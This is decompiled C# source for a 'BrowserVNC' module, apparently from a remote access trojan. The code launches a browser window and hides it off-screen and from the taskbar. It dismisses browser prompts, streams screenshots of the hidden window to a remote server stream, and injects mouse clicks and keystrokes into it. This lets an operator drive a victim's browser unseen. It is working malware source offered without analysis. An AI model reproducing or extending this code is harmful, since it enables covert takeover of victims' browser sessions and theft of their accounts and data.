using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000018 RID: 24
[StandardModule]
internal sealed class BrowserVNC
{
	// Token: 0x060000CA RID: 202
	[DllImport("user32.dll")]
	private static extern bool PrintWindow(IntPtr hwnd, IntPtr hdcBlt, uint nFlags);

	// Token: 0x060000CB RID: 203
	[DllImport("user32.dll")]
	private static extern bool GetWindowRect(IntPtr hWnd, ref BrowserVNC.RECT lpRect);

	// Token: 0x060000CC RID: 204
	[DllImport("user32.dll", SetLastError = true)]
	private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

	// Token: 0x060000CD RID: 205
	[DllImport("user32.dll")]
	public static extern int SetWindowLong(IntPtr hWnd, [MarshalAs(UnmanagedType.I4)] BrowserVNC.WindowLongFlags nIndex, int dwNewintptr);

	// Token: 0x060000CE RID: 206
	[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "SendMessageTimeout", SetLastError = true)]
	public static extern uint SendMessageTimeoutText(IntPtr hWnd, int Msg, int countOfChars, StringBuilder text, BrowserVNC.SendMessageTimeoutFlags flags, uint uTImeoutj, out IntPtr result);

	// Token: 0x060000CF RID: 207
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool EnumDesktopWindows(IntPtr hDesktop, BrowserVNC.MyDelegateCallBack lpEnumCallbackFunction, IntPtr lParam);

	// Token: 0x060000D0 RID: 208
	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool IsWindowVisible(IntPtr hWnd);

	// Token: 0x060000D1 RID: 209
	[DllImport("user32.dll")]
	private static extern IntPtr WindowFromPoint(Point p);

	// Token: 0x060000D2 RID: 210
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

	// Token: 0x060000D3 RID: 211
	[DllImport("dwmapi.dll", PreserveSig = false)]
	public static extern void DwmEnableComposition(bool bEnable);

	// Token: 0x060000D4 RID: 212 RVA: 0x0000FF80 File Offset: 0x0000E180
	public static void Initialize(string browser)
	{
		string title = "Firebird Browser";
		try
		{
			BrowserVNC.DwmEnableComposition(true);
		}
		catch (Exception ex)
		{
		}
		if (Operators.CompareString(browser, "Chrome", false) == 0)
		{
			Process.Start("chrome", "--new-window \"data:text/html,<title>Firebird Browser</title>\" --mute-audio --window-position=" + Conversions.ToString(Screen.PrimaryScreen.Bounds.Width - 5) + "," + Conversions.ToString(Screen.PrimaryScreen.Bounds.Height - 100));
		}
		else if (Operators.CompareString(browser, "Firefox", false) == 0)
		{
			Process.Start("firefox", "-new-window \"data:text/html,<title>Firebird Browser</title>\"");
		}
		else if (Operators.CompareString(browser, "Internet Explorer", false) == 0)
		{
			title = "DuckDuckGo";
			Process.Start("iexplore", "-new -extoff duckduckgo.com");
		}
		else if (Operators.CompareString(browser, "Edge", false) == 0)
		{
			title = "DuckDuckGo";
			Process.Start("microsoft-edge:duckduckgo.com");
		}
		Stopwatch stopwatch = new Stopwatch();
		stopwatch.Start();
		BrowserVNC.foundhandle = 0;
		IntPtr intPtr;
		while (BrowserVNC.foundhandle == intPtr)
		{
			BrowserVNC.foundhandle = BrowserVNC.FindHandle(title);
			if (stopwatch.ElapsedMilliseconds >= 8000L)
			{
				return;
			}
		}
		stopwatch.Stop();
		Functions.ShowWindow(BrowserVNC.foundhandle, 0);
		BrowserVNC.SetWindowLong(BrowserVNC.foundhandle, BrowserVNC.WindowLongFlags.GWL_EXSTYLE, 128);
		Functions.ShowWindow(BrowserVNC.foundhandle, 5);
		BrowserVNC.SetWindowPos(BrowserVNC.foundhandle, (IntPtr)1, 10000, 10000, 776, 426, 64u);
		Stopwatch stopwatch2 = new Stopwatch();
		stopwatch2.Start();
		IntPtr intPtr2;
		while (intPtr2 == intPtr)
		{
			intPtr2 = Functions.FindWindow(null, "Default Browser");
			if (stopwatch2.ElapsedMilliseconds >= 2000L)
			{
				break;
			}
			Thread.Sleep(250);
		}
		if (!(intPtr2 == intPtr))
		{
			Functions.SendMessage(intPtr2, 16, intPtr, intPtr);
		}
	}

	// Token: 0x060000D5 RID: 213 RVA: 0x00010174 File Offset: 0x0000E374
	public static void MainRenderThread(object delay)
	{
		if (BrowserVNC.newt.ThreadState == System.Threading.ThreadState.Running)
		{
			BrowserVNC.newt.Abort();
		}
		BrowserVNC.newt = new Thread(new ParameterizedThreadStart(BrowserVNC.UploadScreenshots));
		BrowserVNC.newt.IsBackground = true;
		BrowserVNC.newt.SetApartmentState(ApartmentState.STA);
		BrowserVNC.newt.Start(RuntimeHelpers.GetObjectValue(delay));
	}

	// Token: 0x060000D6 RID: 214 RVA: 0x000101D4 File Offset: 0x0000E3D4
	public static void StopBrowserThread()
	{
		try
		{
			BrowserVNC.newt.Abort();
			IntPtr intPtr;
			Functions.SendMessage(BrowserVNC.foundhandle, 16, intPtr, intPtr);
			Thread.Sleep(2000);
			BrowserVNC.PostMessage(Functions.FindWindow(null, "Exit and close tabs?"), 256u, (IntPtr)13, (IntPtr)1);
			BrowserVNC.PostMessage(Functions.FindWindow(null, "Close tabs?"), 256u, (IntPtr)13, (IntPtr)1);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060000D7 RID: 215 RVA: 0x00010268 File Offset: 0x0000E468
	public static string returnbrowsers()
	{
		string text = "";
		if (Directory.Exists(Interaction.Environ("appdata") + "\\Google\\Chrome") | Directory.Exists(Interaction.Environ("localappdata") + "\\Google\\Chrome"))
		{
			text = "Chrome|";
		}
		if (Directory.Exists(Interaction.Environ("appdata") + "\\Mozilla\\Firefox") | Directory.Exists(Interaction.Environ("localappdata") + "\\Mozilla\\Firefox"))
		{
			text += "Firefox|";
		}
		if (File.Exists(Interaction.Environ("localappdata") + "\\Microsoft\\WindowsApps\\MicrosoftEdge.exe"))
		{
			text += "Edge|";
		}
		if (Directory.Exists(Interaction.Environ("appdata") + "\\Microsoft\\Internet Explorer") | Directory.Exists(Interaction.Environ("localappdata") + "\\Microsoft\\Internet Explorer"))
		{
			text += "Internet Explorer|";
		}
		return text;
	}

	// Token: 0x060000D8 RID: 216
	[DllImport("user32.dll")]
	private static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, uint flags);

	// Token: 0x060000D9 RID: 217 RVA: 0x00010360 File Offset: 0x0000E560
	public static void UploadScreenshots(object delay)
	{
		for (;;)
		{
			try
			{
				BrowserVNC.GetWindowRect(BrowserVNC.foundhandle, ref BrowserVNC.wr);
				BrowserVNC.screenCapture = new Bitmap(BrowserVNC.wr.Right - BrowserVNC.wr.Left + 1, BrowserVNC.wr.Bottom - BrowserVNC.wr.Top + 1);
				BrowserVNC.screenCapture.SetResolution(302f, 302f);
				BrowserVNC.g = Graphics.FromImage(BrowserVNC.screenCapture);
				BrowserVNC.hdc = BrowserVNC.g.GetHdc();
				if (Conversions.ToBoolean(BrowserVNC.Isgreaterorequalto81()))
				{
					BrowserVNC.PrintWindow(BrowserVNC.foundhandle, BrowserVNC.hdc, 2u);
				}
				else
				{
					BrowserVNC.PrintWindow(BrowserVNC.foundhandle, BrowserVNC.hdc, 0u);
				}
				BrowserVNC.g.ReleaseHdc(BrowserVNC.hdc);
				BrowserVNC.g.Flush();
				BrowserVNC.g.Dispose();
				Functions.uploadserialized(Server.nstream, BrowserVNC.screenCapture);
				BrowserVNC.screenCapture.Dispose();
				GC.Collect();
			}
			catch (Exception ex)
			{
				try
				{
					BrowserVNC.screenCapture.Dispose();
					BrowserVNC.g.ReleaseHdc();
					BrowserVNC.g.Flush();
					BrowserVNC.g.Dispose();
				}
				catch (Exception ex2)
				{
				}
			}
			Thread.Sleep(Conversions.ToInteger(delay));
		}
	}

	// Token: 0x060000DA RID: 218 RVA: 0x000104C8 File Offset: 0x0000E6C8
	public static void PostClickLD(int x, int y)
	{
		BrowserVNC.RECT rect = default(BrowserVNC.RECT);
		BrowserVNC.GetWindowRect(BrowserVNC.foundhandle, ref rect);
		Point point = new Point(10000 + x - rect.Left, 10000 + y - rect.Top);
		BrowserVNC.PostMessage(BrowserVNC.foundhandle, 513u, (IntPtr)0L, (IntPtr)BrowserVNC.MakeLParam(point.X, point.Y));
	}

	// Token: 0x060000DB RID: 219 RVA: 0x00010540 File Offset: 0x0000E740
	public static void PostClickLU(int x, int y)
	{
		BrowserVNC.RECT rect = default(BrowserVNC.RECT);
		BrowserVNC.GetWindowRect(BrowserVNC.foundhandle, ref rect);
		Point point = new Point(10000 + x - rect.Left, 10000 + y - rect.Top);
		BrowserVNC.PostMessage(BrowserVNC.foundhandle, 514u, (IntPtr)0L, (IntPtr)BrowserVNC.MakeLParam(point.X, point.Y));
	}

	// Token: 0x060000DC RID: 220 RVA: 0x000105B8 File Offset: 0x0000E7B8
	public static void PostClickRD(int x, int y)
	{
		BrowserVNC.RECT rect = default(BrowserVNC.RECT);
		BrowserVNC.GetWindowRect(BrowserVNC.foundhandle, ref rect);
		Point point = new Point(10000 + x - rect.Left, 10000 + y - rect.Top);
		BrowserVNC.PostMessage(BrowserVNC.foundhandle, 516u, (IntPtr)0L, (IntPtr)BrowserVNC.MakeLParam(x - rect.Left, y - rect.Top));
	}

	// Token: 0x060000DD RID: 221 RVA: 0x00010634 File Offset: 0x0000E834
	public static void PostClickRU(int x, int y)
	{
		BrowserVNC.RECT rect = default(BrowserVNC.RECT);
		BrowserVNC.GetWindowRect(BrowserVNC.foundhandle, ref rect);
		Point point = new Point(10000 + x - rect.Left, 10000 + y - rect.Top);
		BrowserVNC.PostMessage(BrowserVNC.foundhandle, 517u, (IntPtr)0L, (IntPtr)BrowserVNC.MakeLParam(x - rect.Left, y - rect.Top));
	}

	// Token: 0x060000DE RID: 222 RVA: 0x000106B0 File Offset: 0x0000E8B0
	public static void PostKeydown(string k)
	{
		int num = Strings.AscW(k);
		if (num == 8 | num == 13)
		{
			BrowserVNC.PostMessage(BrowserVNC.foundhandle, 256u, (IntPtr)Conversions.ToInteger("&H" + Conversion.Hex(Strings.AscW(k))), (IntPtr)1);
		}
		else
		{
			BrowserVNC.PostMessage(BrowserVNC.foundhandle, 258u, (IntPtr)Strings.AscW(k), (IntPtr)1);
		}
	}

	// Token: 0x060000DF RID: 223 RVA: 0x00010728 File Offset: 0x0000E928
	public static IntPtr FindHandle(string title)
	{
		BrowserVNC.collection = new List<string>();
		BrowserVNC.collection2 = new List<IntPtr>();
		BrowserVNC.MyDelegateCallBack lpEnumCallbackFunction = new BrowserVNC.MyDelegateCallBack(BrowserVNC.filter);
		BrowserVNC.EnumDesktopWindows(IntPtr.Zero, lpEnumCallbackFunction, IntPtr.Zero);
		int i = BrowserVNC.collection.Count - 1;
		IntPtr result;
		while (i >= 0)
		{
			if (BrowserVNC.collection[i].ToLower().Contains(title.ToLower()))
			{
				object obj = NewLateBinding.LateIndexGet(BrowserVNC.collection2, new object[]
				{
					i
				}, null);
				if (obj == null)
				{
					return result;
				}
				return (IntPtr)obj;
			}
			else
			{
				i += -1;
			}
		}
		return result;
	}

	// Token: 0x060000E0 RID: 224 RVA: 0x000107CC File Offset: 0x0000E9CC
	public static bool filter(IntPtr hWnd, int lParam)
	{
		StringBuilder stringBuilder = new StringBuilder(255);
		IntPtr hWnd2 = hWnd;
		int msg = 13;
		int countOfChars = stringBuilder.Capacity + 1;
		StringBuilder text = stringBuilder;
		BrowserVNC.SendMessageTimeoutFlags flags = BrowserVNC.SendMessageTimeoutFlags.SMTO_ABORTIFHUNG;
		uint uTImeoutj = 1000u;
		IntPtr zero = IntPtr.Zero;
		int num = (int)BrowserVNC.SendMessageTimeoutText(hWnd2, msg, countOfChars, text, flags, uTImeoutj, out zero);
		string text2 = stringBuilder.ToString();
		if (BrowserVNC.IsWindowVisible(hWnd) && !string.IsNullOrEmpty(text2))
		{
			object instance = BrowserVNC.collection2;
			Type type = null;
			string memberName = "Add";
			object[] array = new object[]
			{
				hWnd
			};
			object[] arguments = array;
			string[] argumentNames = null;
			Type[] typeArguments = null;
			bool[] array2 = new bool[]
			{
				true
			};
			NewLateBinding.LateCall(instance, type, memberName, arguments, argumentNames, typeArguments, array2, true);
			if (array2[0])
			{
				hWnd = (IntPtr)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(IntPtr));
			}
			BrowserVNC.collection.Add(text2);
		}
		return true;
	}

	// Token: 0x060000E1 RID: 225 RVA: 0x00010890 File Offset: 0x0000EA90
	public static int MakeLParam(int LoWord, int HiWord)
	{
		return HiWord << 16 | (LoWord & 65535);
	}

	// Token: 0x060000E2 RID: 226 RVA: 0x000108AC File Offset: 0x0000EAAC
	public static void ResizeBrowser(int w, int h)
	{
		BrowserVNC.SetWindowPos(BrowserVNC.foundhandle, (IntPtr)1, 10000, 10000, w, h, 64u);
	}

	// Token: 0x060000E3 RID: 227 RVA: 0x000108D0 File Offset: 0x0000EAD0
	public static object Isgreaterorequalto81()
	{
		OperatingSystem osversion = Environment.OSVersion;
		Version version = osversion.Version;
		if (osversion.Platform == PlatformID.Win32NT)
		{
			int major = version.Major;
			if (major == 6 && version.Minor != 0 && version.Minor != 1)
			{
				return true;
			}
		}
		return false;
	}

	// Token: 0x04000040 RID: 64
	private static Thread newt = new Thread(new ParameterizedThreadStart(BrowserVNC.UploadScreenshots));

	// Token: 0x04000041 RID: 65
	private static IntPtr foundhandle;

	// Token: 0x04000042 RID: 66
	private static IntPtr focusedhandle;

	// Token: 0x04000043 RID: 67
	private static BrowserVNC.RECT wr = default(BrowserVNC.RECT);

	// Token: 0x04000044 RID: 68
	private static Bitmap screenCapture;

	// Token: 0x04000045 RID: 69
	private static Graphics g;

	// Token: 0x04000046 RID: 70
	private static IntPtr hdc;

	// Token: 0x04000047 RID: 71
	private static long backupforeground;

	// Token: 0x04000048 RID: 72
	private static List<string> collection = new List<string>();

	// Token: 0x04000049 RID: 73
	private static object collection2 = new List<IntPtr>();

	// Token: 0x02000029 RID: 41
	// (Invoke) Token: 0x060000F7 RID: 247
	public delegate bool MyDelegateCallBack(IntPtr hwnd, int lParam);

	// Token: 0x0200002A RID: 42
	public struct RECT
	{
		// Token: 0x0400009C RID: 156
		public int Left;

		// Token: 0x0400009D RID: 157
		public int Top;

		// Token: 0x0400009E RID: 158
		public int Right;

		// Token: 0x0400009F RID: 159
		public int Bottom;
	}

	// Token: 0x0200002B RID: 43
	public enum WindowLongFlags
	{
		// Token: 0x040000A1 RID: 161
		GWL_EXSTYLE = -20,
		// Token: 0x040000A2 RID: 162
		GWLP_HINSTANCE = -6,
		// Token: 0x040000A3 RID: 163
		GWLP_HWNDPARENT = -8,
		// Token: 0x040000A4 RID: 164
		GWL_ID = -12,
		// Token: 0x040000A5 RID: 165
		GWL_STYLE = -16,
		// Token: 0x040000A6 RID: 166
		GWL_USERDATA = -21,
		// Token: 0x040000A7 RID: 167
		GWL_WNDPROC = -4,
		// Token: 0x040000A8 RID: 168
		DWLP_USER = 8,
		// Token: 0x040000A9 RID: 169
		DWLP_MSGRESULT = 0,
		// Token: 0x040000AA RID: 170
		DWLP_DLGPROC = 4
	}

	// Token: 0x0200002C RID: 44
	[Flags]
	public enum SendMessageTimeoutFlags
	{
		// Token: 0x040000AC RID: 172
		SMTO_NORMAL = 0,
		// Token: 0x040000AD RID: 173
		SMTO_BLOCK = 1,
		// Token: 0x040000AE RID: 174
		SMTO_ABORTIFHUNG = 2,
		// Token: 0x040000AF RID: 175
		SMTO_NOTIMEOUTIFNOTHUNG = 8,
		// Token: 0x040000B0 RID: 176
		SMTO_ERRORONEXIT = 32
	}
}
